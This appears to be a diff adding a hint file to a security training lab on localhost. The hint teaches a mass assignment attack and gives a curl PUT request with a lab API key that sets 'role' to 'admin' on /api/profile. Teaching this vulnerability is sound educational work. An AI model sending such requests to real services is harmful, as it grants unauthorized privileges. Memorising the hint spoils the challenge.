@@ -1,0 +1,10 @@
+💡 Hint 2: Mass Assignment Attack
+
+The documentation says you can only update 'username', 'email', and 'bio' fields.
+But what if you try to update other fields like 'role', 'is_premium', or 'account_balance'?
+
+Try sending a PUT request to /api/profile with additional fields:
+curl -X PUT http://localhost:4002/api/profile \
+  -H 'API-Key: alice_api_key_12345' \
+  -H 'Content-Type: application/json' \
+  -d '{"role":"admin"}'
